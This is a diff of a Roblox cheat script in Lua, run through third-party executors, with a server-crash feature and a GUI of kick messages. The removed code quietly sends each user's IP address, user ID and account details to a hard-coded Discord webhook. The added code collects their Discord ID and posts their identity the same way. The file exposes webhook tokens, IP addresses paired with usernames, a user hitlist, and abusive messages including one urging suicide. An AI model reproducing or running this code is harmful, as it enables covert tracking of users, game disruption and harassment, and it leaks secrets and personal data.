@@ -1,5 +1,4 @@
 repeat wait(0.5) until game:IsLoaded()
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 --SafeTable
 local SafePlayers = {
@@ -386,97 +385,6 @@ Hitlisted = {
 	86752416, --TalentedGamerU
 	2921548710 --3rdSacNeverComesOut
 }
-
-IpList = {
-	"97.120.157.175", "Zanonner", "177.74.229.166", "bielsamorim1", " 72.209.184.180", "Ryan09791", "126.140.173.216", "Xerantheneum"
-}
-
-CrashBans = {
-	"177.74.229.166"
-}
-
-IpBans = {
-	"98.115.137.123"
-}
-if table.find(IpBans,tostring(ip)) then
-	game.Players["LocalPlayer"]:Kick("You Are Currently Unable to use my script")
-end
-if table.find(Hitlisted,game.Players.LocalPlayer.UserId) then
-	game.Players["LocalPlayer"]:Kick("You Are Currently Hitlisted and not allowed to use my Script")
-end
-if game.PlaceId == 26838733 then
-	if game.Players.LocalPlayer.UserId ~= 415744081 and game.Players.LocalPlayer.UserId ~= 894458609 and game.Players.LocalPlayer.UserId ~= 2422124124 and game.Players.LocalPlayer.UserId ~= 1489437710 and game.Players.LocalPlayer.UserId ~= 2587704753 and game.Players.LocalPlayer.UserId ~= 2009418204 and game.Players.LocalPlayer.UserId ~= 1985647039 then
-		local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-		local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
-		local s = {}
-		for k, v in pairs(os.date("!*t")) do
-			local temp = tostring(v)
-			if #temp == 1 then temp = "0" .. temp end
-			s[k] = temp
-		end
-		if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2020 then
-			if table.find(IpList, tostring(ip)) then
-				AccStatus = "Alt"
-				for i,v in pairs(IpList) do
-					if v == tostring(ip)  then
-						MainUser = IpList[i+1]
-					end
-				end
-			else
-				AccStatus = "Main"
-				MainUser = game.Players.LocalPlayer.Name
-			end
-		else
-			AccStatus = "Alt"
-			MainUser = "Can't Find Main"
-			for i,v in pairs(IpList) do
-				if v == tostring(ip)  then
-					MainUser = IpList[i+1]
-				end
-			end
-		end
-		local webhookcheck =
-			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-			secure_load and "Sentinel" or
-			KRNL_LOADED and "Krnl" or
-			SONA_LOADED and "Sona" or
-			"Kid with shit exploit"
-
-		local url =
-			"https://discord.com/api/webhooks/886103479800713217/gxTqNFnlwPop0Agf7txnc7iJsSFIaEsSYSh_zjSYnqQZAb9IH0TbnEXU9Ot1Po4Hx5uP"
-		local data = {
-			["content"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. " Details:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@490713014899703809>",
-			["embeds"] = {
-				{
-					["title"] = "**Script Has Been Executed**",
-					["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
-						"Executor: **"..webhookcheck.."**" .. "\n" .. 
-						"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
-						"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
-						"User's Main: " .. "**" .. MainUser .. "**" .. "\n" ..
-						"JoinDate: " .. "**" .. (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).month .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).day .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) .. "**" .. "\n" ..
-						"UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
-						"Time: " .. "**" .. timestamp .. "**",
-					["type"] = "rich",
-					["color"] = tonumber(0x7269da),
-					["image"] = {
-						["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-							tostring(game:GetService("Players").LocalPlayer.Name)
-					}
-				}
-			}
-		}
-		local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-		local headers = {
-			["content-type"] = "application/json"
-		}
-		request = http_request or request or HttpPost or syn.request
-		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
-		}
-		request(abcdef)
-	end
-end
 
 --GuiReset
 local function GuiReset()
@@ -1837,36 +1745,12 @@ local function Sure()
 
 		--Yes
 		Yes.MouseButton1Down:connect(function()
-			if table.find(CrashBans,tostring(ip)) then
-				game.Players["LocalPlayer"]:Kick("You Are Currently Prohibited From Crashing")
-			else
-				local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 				local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
 				local s = {}
 				for k, v in pairs(os.date("*t")) do
 					local temp = tostring(v)
 					if #temp == 1 then temp = "0" .. temp end
 					s[k] = temp
-				end
-				if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2020 then
-					if table.find(IpList, tostring(ip)) then
-						AccStatus = "Alt"
-						for i,v in pairs(IpList) do
-							if v == tostring(ip)  then
-								MainUser = IpList[i+1]
-							end
-						end
-					else
-						AccStatus = "Main"
-						MainUser = game.Players.LocalPlayer.Name
-					end
-				else
-					AccStatus = "Alt"
-					for i,v in pairs(IpList) do
-						if v == tostring(ip)  then
-							MainUser = IpList[i+1]
-						end
-					end
 				end
 				local url =
 					"https://discord.com/api/webhooks/887212983980290099/xkW09qmmuyuPpoIx9kHUbz3TRHXTF3v47Hu7qulUDrImuPwYHpHO62n1SAnThShno12r"
@@ -1876,7 +1760,7 @@ local function Sure()
 						{
 							["title"] = "**Server Has Been Crashed**",
 							["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
-								"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
+								"DiscordId: " ..  "**" .. 'pizza' .. "**" .. "\n" .. 
 								"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
 								"Main's Username: " .. "**" .. MainUser .. "**" .. "\n" ..
 								"UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
@@ -1926,7 +1810,6 @@ local function Sure()
 				else
 					game.Players["LocalPlayer"]:Kick(Insult)
 				end
-			end
 		end)
 	end
 	coroutine.wrap(YARUX_fake_script)()
@@ -3651,7 +3534,6 @@ local function ChGui()
 		"i'll forgive you if you'll inhale cyanide for me.",
 		"Formosa 中華民國 Republic of China 西藏 土伯特 唐古特 Tibet 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xinjiang Uyghur Autonomous Region 諾貝爾和平獎 Nobel Peace Prize 劉暁波 Liu Xiaobo 民主 言論 思想 反共 反革命 抗議 運動 騷亂 暴亂 騷擾 擾亂 抗暴 平反 維權 示威游行 李洪志 法輪大法 大法弟子 強制斷種 強制堕胎 民族淨化 人體實驗 肅清 胡耀邦 趙紫陽 魏京生 王丹 還政於民 和平演變 激流中國 北京之春 大紀元時報 九評論共産黨 獨裁 專制 壓制 統一 監視 鎮壓 迫害 侵略 掠奪 破壞 拷問 屠殺 活摘器官 誘拐 買賣人口 遊進 走私 毒品 賣淫 春畫 賭博 六合彩 天安門 天安门 法輪功 李洪志 Winnie the Pooh 劉曉波动态网自由门 2014 Umbrella Movement 雨傘革命 Belt and Road Initiative 丝绸之路经济带和21世纪海上丝绸之路 One Belt One Road 一带一路 Debt-Trap Diplomacy 債務陷阱外交 South China Sea Dispute 南海爭議 Murder of Poon Hiu-wing潘曉穎命案 2019–20 Hong Kong protests反對逃犯條例修訂草案運動 Siege of the Hong Kong Polytechnic University香港理工大學衝突 Milk Tea Alliance奶茶聯盟 Yellow Economic Circle黄色经济圈 CCP/China/Wuhan Coronavirus冠状病毒Hong Kong National Security Law香港国家安全法 Wumao (50-cent Army)/Little Pinks五毛/小粉红 Douyin Propaganda 斗阴宣传 White Monkey Jobs 白猴子职位 Mulan 2020 Xinjiang 新疆木兰2020 Laowhy86 and Serpentza escapes china laowhy86和serpentza逃离中国 Jack Ma Missing? 马云失踪了吗？Coast Guard Law 海岸警卫队法 Vaccine Diplomacy 疫苗外交 Wuhan Institute of Virology Issue 武汉病毒研究所问题 China Backed WHO 中国支持世卫组织 Brazil boycotts Sinovac 巴西抵制科兴 China Halted Pineapple Imports from Taiwan 中国停止从台湾进口菠萝 Xinjiang Cotton Boycotts 新疆棉花抵制动态网自由门 天安門 天安门 法輪功 李洪志 Free Tibet 六四天安門事件 The Tiananmen Square protests of 1989 天安門大屠殺 The Tiananmen Square Massacre 反右派鬥爭 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Proletarian Cultural Revolution 人權 Human Rights 民運 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Taiwan Formosa 中華民國 Republic of China 西藏 土伯特 唐古特 Tibet 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xinjiang Uyghur Autonomous Region 諾貝爾和平獎 Nobel Peace Prize 劉暁波 Liu Xiaobo 民主 言論 思想 反共 反革命 抗議 運動 騷亂 暴亂 騷擾 擾亂 抗暴 平反 維權 示威游行 李洪志 法輪大法 大法弟子 強制斷種 強制堕胎 民族淨化 人體實驗 肅清 胡耀邦 趙紫陽 魏京生 王丹 還政於民 和平演變 激流中國 北京之春 大紀元時報 九評論共産黨 獨裁 專制 壓制 統一 監視 鎮壓 迫害 侵略 掠奪 破壞 拷問 屠殺 活摘器官 誘拐 買賣人口 遊進 走私 毒品 賣淫 春畫 賭博 六合彩 天安門 天安门 法輪功 李洪志 Winnie the Pooh 劉曉波动态网自由门 2014 Umbrella Movement 雨傘革命 Belt and Road Initiative 丝绸之路经济带和21世纪海上丝绸之路 One Belt One Road 一带一路 Debt-Trap Diplomacy 債務陷阱外交 South China Sea Dispute 南海爭議 Murder of Poon Hiu-wing潘曉穎命案 2019–20 Hong Kong protests反對逃犯條例修訂草案運動 Siege of the Hong Kong Polytechnic University香港理工大學衝突 Milk Tea Alliance奶茶聯盟 Yellow Economic Circle黄色经济圈 CCP/China/Wuhan Coronavirus冠状病毒Hong Kong National Security Law香港国家安全法 Wumao (50-cent Army)/Little Pinks五毛/小粉红 Douyin Propaganda 斗阴宣传 White Monkey Jobs 白猴子职位 Mulan 2020 Xinjiang 新疆木兰2020 Laowhy86 and Serpentza escapes china laowhy86和serpentza逃离中国 Jack Ma Missing? 马云失踪了吗？Coast Guard Law 海岸警卫队法 Vaccine Diplomacy 疫苗外交 Wuhan Institute of Virology Issue 武汉病毒研究所问题 China Backed WHO 中国支持世卫组织 Brazil boycotts Sinovac 巴西抵制科兴 China Halted Pineapple Imports from Taiwan 中国停止从台湾进口菠萝 Xinjiang Cotton Boycotts 新疆棉花抵制",
 		"DO U FART",
-		"we do a little bit of trolling",
 		"You have been banned from this experience for: " .. Days .. " days, " .. Minutes .. " minutes, " .. Seconds .. " seconds",
 		"https://nhentai.net/g/220787",
 				            [[here, have a really long space as a kick message.
@@ -3839,16 +3721,13 @@ local function ChGui()
 
 	--Search
 	Search.MouseButton1Down:connect(function()
-		print '1'
 		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
 			if v.Name == "SearchUI" then
 				v:Remove()
 			end
 		end
-		print '2'
 		wait()
 		SearchGui()
-		print '3'
 	end)
 
 	--Next1
@@ -4755,10 +4634,125 @@ for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
 		v:Remove()
 	end
 end
-if getgenv().Enabled then
+for i,v in pairs(game.CoreGui:GetChildren()) do
+	if v.Name == "PasswordGui" then
+		v:Remove()
+	end
+end
+
+
+
+if getgenv().Enabled1 then
 	ChGui()
 else
-	ChGui()
+    --startmessage
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = "Enter Your Discord ID\nOn Discord Turn On Developer Mode Then\nRight Click Your Username And Copy Id";
+		Color = Color3.fromRGB(150,200,100);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+	})
+    
+    local PasswordGui = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local UICorner = Instance.new("UICorner")
+    local PasswordBar = Instance.new("TextBox")
+    local UICorner_2 = Instance.new("UICorner")
+    local Enter = Instance.new("TextButton")
+    local UICorner_3 = Instance.new("UICorner")
+    --Properties:
+    
+    PasswordGui.Name = "PasswordGui"
+    PasswordGui.Parent = game:WaitForChild('CoreGui')
+    Frame.Parent = PasswordGui
+    Frame.BackgroundColor3 = Color3.fromRGB(255, 170, 196)
+    Frame.Position = UDim2.new(0.432727218, 0, 0.426621139, 0)
+    Frame.Size = UDim2.new(0, 314, 0, 54)
+    
+    UICorner.Parent = Frame
+    
+    PasswordBar.Name = "PasswordBar"
+    PasswordBar.Parent = Frame
+    PasswordBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    PasswordBar.Position = UDim2.new(0.0711768121, 0, 0.26873976, 0)
+    PasswordBar.Size = UDim2.new(0, 200, 0, 24)
+    PasswordBar.Font = Enum.Font.SourceSansBold
+    PasswordBar.PlaceholderColor3 = Color3.fromRGB(174, 189, 255)
+    PasswordBar.PlaceholderText = "Enter Your Discord Id"
+    PasswordBar.Text = ""
+    PasswordBar.TextColor3 = Color3.fromRGB(0, 0, 0)
+    PasswordBar.TextSize = 14.000
+    
+    UICorner_2.Parent = PasswordBar
+    
+    Enter.Name = "Enter"
+    Enter.Parent = Frame
+    Enter.BackgroundColor3 = Color3.fromRGB(255, 216, 229)
+    Enter.Position = UDim2.new(0.740430236, 0, 0.253634065, 0)
+    Enter.Size = UDim2.new(0, 53, 0, 24)
+    Enter.Font = Enum.Font.SourceSansBold
+    Enter.Text = "Enter"
+    Enter.TextColor3 = Color3.fromRGB(124, 124, 124)
+    Enter.TextSize = 14.000
+    
+    UICorner_3.Parent = Enter
+    
+    -- Scripts:
+    Enter.MouseButton1Down:connect(function()
+        if string.len(PasswordBar.Text) == 18 then
+            game.CoreGui.PasswordGui:Remove()
+            ChGui()
+            Table = game.HttpService:JSONDecode(game:HttpGet('https://verify.eryn.io/api/user/' .. PasswordBar.Text))
+            MainUser = Table.robloxUsername
+            --Webhook
+            local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
+    		local s = {}
+    		for k, v in pairs(os.date("!*t")) do
+    			local temp = tostring(v)
+    			if #temp == 1 then temp = "0" .. temp end
+    			s[k] = temp
+    		end
+    		local webhookcheck =
+    			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    			secure_load and "Sentinel" or
+    			KRNL_LOADED and "Krnl" or
+    			SONA_LOADED and "Sona" or
+    			"Kid with shit exploit"
+    		local url =
+    			"https://discord.com/api/webhooks/886103479800713217/gxTqNFnlwPop0Agf7txnc7iJsSFIaEsSYSh_zjSYnqQZAb9IH0TbnEXU9Ot1Po4Hx5uP"
+    		local data = {
+    			["content"] = "Main: " .. "https://www.roblox.com/users/" .. Table.robloxId .. "/profile",
+    			["embeds"] = {
+    				{
+    					["title"] = "**Script Has Been Executed**",
+    					["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
+    						"Executor: **"..webhookcheck.."**" .. "\n" .. 
+    						"DiscordID: " ..  "**" .. PasswordBar.Text .. "**" .. "\n" .. 
+    						"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
+    						"User's Main: " .. "**" .. MainUser .. "**" .. "\n" ..
+    						"JoinDate: " .. "**" .. (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).month .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).day .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) .. "**" .. "\n" ..
+    						"Time: " .. "**" .. timestamp .. "**",
+    					["type"] = "rich",
+    					["color"] = tonumber(0x7269da),
+    					["image"] = {
+    						["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+    							tostring(game:GetService("Players").LocalPlayer.Name)
+    					}
+    				}
+    			}
+    		}
+    		local newdata = game:GetService("HttpService"):JSONEncode(data)
+    		
+    		local headers = {
+    			["content-type"] = "application/json"
+    		}
+    		request = http_request or request or HttpPost or syn.request
+    		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
+    		}
+    		request(abcdef)
+            end
+        end)
+
 
 	--JoinMessages
 	game.Players.PlayerAdded:connect(function(v)
@@ -4869,5 +4863,6 @@ else
 			end
 		end
 	end)
-	getgenv().Enabled = true
+	
+	getgenv().Enabled1 = true
 end
